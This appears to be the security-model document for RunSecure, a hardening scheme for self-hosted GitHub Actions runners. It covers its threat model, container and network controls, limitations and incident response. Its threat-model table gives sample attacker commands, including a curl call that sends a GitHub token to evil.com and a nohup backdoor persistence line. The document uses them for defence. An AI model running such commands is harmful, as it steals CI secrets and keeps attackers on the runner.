# Security Model

RunSecure provides defense-in-depth for GitHub Actions self-hosted runners through three independent layers: **image hardening**, **runtime containment**, and **network isolation**. Each layer protects against distinct attack vectors, and a breach of one layer does not compromise the others.

---

## Threat Model

### Who are we defending against?

1. **Compromised third-party Actions** (e.g., `tj-actions/changed-files` supply chain attack, March 2025)
2. **Malicious npm/PyPI packages** pulled during `npm install` or `pip install`
3. **Poisoned pull requests** from forks that execute code on the runner
4. **Insider threats** — malicious workflow steps added by compromised accounts

### What are they trying to do?

| Goal | Example |
|------|---------|
| **Exfiltrate secrets** | `curl http://evil.com?token=$GITHUB_TOKEN` |
| **Persist on the machine** | `RUNNER_TRACKING_ID=0 nohup backdoor &` |
| **Move laterally** | SSH to internal hosts, access cloud metadata |
| **Cryptomine** | Download and run a miner binary |
| **Tamper with builds** | Modify build output, inject malicious code |

---

## Hardening Layers

### Layer 1: Image Hardening (build-time)

Reduces the attack surface inside the container by removing tools and capabilities an attacker would need.

| Hardening | What it prevents | Verified by |
|-----------|-----------------|-------------|
| Non-root user (UID 1001) | Root-level filesystem and process access | `validate-runner.sh` |
| `su`/`sudo` binaries removed | Privilege escalation via user switching | `validate-runner.sh` |
| All setuid/setgid bits stripped | Privilege escalation via setuid binaries | `validate-runner.sh` |
| Root account locked, shell set to nologin | Login as root | `validate-runner.sh` |
| Package manager removed (apt/dpkg) in final images | Installing attack tools at runtime | `validate-runner.sh` |
| Network recon tools removed (ping, nc, ssh, wget) | Network reconnaissance, lateral movement | `validate-runner.sh` |
| Persistence tools removed (crontab, at) | Surviving job completion | `validate-runner.sh` |
| SHA256-verified binary downloads | Supply chain attacks on runner binary | `base.Dockerfile` |
| Pinned package versions | Version-swap supply chain attacks | `base.Dockerfile` |
| `--no-install-recommends` on all apt installs | Reducing unneeded packages | `base.Dockerfile` |
| Multi-stage builds (compilers not in final image) | Building exploits on-host | `compose-image.sh` |

### Layer 2: Runtime Containment (launch-time)

Enforced by Docker flags when the container starts. Cannot be circumvented by code inside the container.

| Flag | What it prevents | Verified by |
|------|-----------------|-------------|
| `--rm` | State persisting between jobs | `run-all-tests.sh` (cleanup test) |
| `--user 1001:0` | Running as root; system paths (root-owned) not writable | `validate-runner.sh` |
| `--tmpfs /tmp:noexec` | Executing downloaded binaries from /tmp | `validate-runner.sh` |
| `--cap-drop=ALL` | All Linux capability-based attacks | `test-attack-simulation.sh` |
| `--security-opt=no-new-privileges` | Privilege escalation via setuid/setgid at runtime | `test-attack-simulation.sh` |
| `--pids-limit` | Fork bombs, unbounded process spawning | `run-all-tests.sh` (PID test) |
| `--memory` / `--memory-swap` | Memory exhaustion, OOM attacks | `validate-runner.sh` |
| `--cpus` | CPU exhaustion (cryptomining) | `validate-runner.sh` |
| Seccomp profile (`node-runner.json`) | Dangerous syscalls (ptrace, mount, bpf, keyctl) | Architecture |

### Layer 3: Network Isolation (network-level)

The Docker network architecture prevents the container from reaching the internet directly. All traffic must pass through the Squid proxy.

| Control | What it prevents | Verified by |
|---------|-----------------|-------------|
| Internal Docker network | Direct internet access bypassing proxy | `test-egress-proxy.sh` (bypass test) |
| Squid domain allowlist | Exfiltration to attacker servers | `test-egress-proxy.sh` (25 checks) |
| CONNECT method filtering | HTTPS exfiltration to blocked domains | `test-egress-proxy.sh` |
| Non-standard port blocking | Connections on ports other than 443 | `test-egress-proxy.sh` |
| Cloud metadata endpoint blocking | SSRF to 169.254.169.254 / metadata.google.internal | `test-egress-proxy.sh` |
| Proxy access log | Post-incident forensics | `squid/base.conf` |
| HAProxy TCP egress allowlist | Raw TCP connections to non-approved host:port | `test-tcp-egress.sh` |
| SSRF protection in config fetcher | Private/RFC1918/loopback IPs in dns.hosts_file/whitelist_file URLs | `test-ssrf-protection.sh` (22 checks) |
| dnsmasq DNS isolation | Leaking internal queries to host resolver when dns.host:false | `test-dns-validation.sh` |
| Schema validation | Malformed runner.yml reaching the proxy generator | `test-strict-schema-rejection.sh` |

---

## Known Limitations

### What RunSecure does NOT protect against

1. **Attacks that only use allowed domains.** If an attacker exfiltrates data to `github.com` (e.g., creating an issue or pushing to a repo they control), the proxy allows it because `github.com` is in the allowlist. Mitigate with minimal `GITHUB_TOKEN` permissions.

2. **DNS-based exfiltration via the proxy.** The Squid proxy resolves DNS for allowed domains. An attacker could theoretically encode data in DNS queries to an allowed domain's nameserver. This is a very low-bandwidth channel.

3. **Timing side-channel attacks.** Resource limits prevent large-scale abuse but don't prevent information leakage via timing.

4. **Kernel exploits.** If the Linux kernel in the Docker VM has an unpatched vulnerability, a sufficiently sophisticated attacker could escape the container. Keep Docker Desktop / Colima updated.

5. **Docker daemon compromise.** The runner does NOT mount the Docker socket. But if the Docker daemon itself is compromised on the host, all containers are at risk.

6. **TCP port collisions.** Each `tcp_egress` port must be unique. If two services use the same port number, only one can be added.

7. **TCP egress is content-opaque.** haproxy forwards bytes; no TLS termination, no protocol-aware ACL. Audit story is "who connected to what, when, for how long" — not "what was sent."

8. **The egress proxy is fail-closed.** If squid, haproxy, or dnsmasq dies, the container exits and the runner's connections start failing. There is no graceful degradation.

9. **`egress:` field removed.** Replaced by `http_egress:`. Configs still using `egress:` are rejected at orchestrator startup with an "unknown field" error from the strict-schema validator.

10. **No UDP egress.** UDP traffic (other than DNS via dnsmasq when `dns.host: false`) is not proxied.

11. **CONNECT method only.** HTTP/HTTPS goes through Squid CONNECT — no TLS interception. Some HTTP/1.0 clients without CONNECT support may fail.

12. **DNS log sensitivity.** When `dns.host: false` and `dns.log_queries: true`, query names appear in `_diag-proxy/`. Set `dns.log_queries: false` on sensitive CI hosts.

13. **`_diag/` and `_diag-proxy/` host-mounted volumes.** As of this release, the runner's `_diag/` directory is host-mounted at the orchestrator's working directory for operator-side log recovery. Workflows that echo secrets to stdout/stderr (`set -x`, debug-print of `$DATABASE_URL`) leave those secrets in `_diag/Worker_*.log` until rotation (one previous run is kept). On shared CI hosts, set `RUNSECURE_DIAG_RETENTION=0` to disable the bind mount — the synchronous log-upload wait still ensures `gh api .../jobs/<id>/logs` works.

### Accepted Risks

- **apt binary exists in intermediate images** (language layers). It is removed in final composed images via `finalize-hardening.sh`. In intermediate images, the runner user (UID 1001) cannot install system packages without root/capabilities.
- **Container filesystem is writable by the runner user** in its home directory. The GH Actions runner requires this to write config, diagnostic logs, and download actions at runtime. System paths (`/usr`, `/etc`) are protected by root ownership and `chmod 555`. The container is ephemeral (`--rm`) so nothing persists.
- **`/proc/self/environ` is readable.** This is standard in containers. The environment should contain only non-secret configuration. GitHub Actions injects secrets at runtime and they are redacted from logs (though this is not a security boundary).

---

## Incident Response

### If a CI job is compromised

1. The container is already destroyed (ephemeral + `--rm`).
2. Check the Squid proxy access log for any successful outbound connections to unexpected domains.
3. Rotate any secrets that were available to the workflow.
4. Audit the workflow file and all referenced Actions for tampering.

### If the proxy access log shows unexpected traffic

1. Identify the domain and the workflow run that generated the traffic.
2. Check if a dependency update introduced a new network call.
3. If malicious, pin the dependency version and report the package.

### Updating after a security advisory

1. Rebuild base images: `docker build -f images/base.Dockerfile --no-cache -t runner-base:latest .`
2. Rebuild language images (they inherit from base).
3. Re-run validation: `./tests/validation/run-all-tests.sh`
4. Re-run integration tests: `./tests/integration/run-integration-tests.sh`
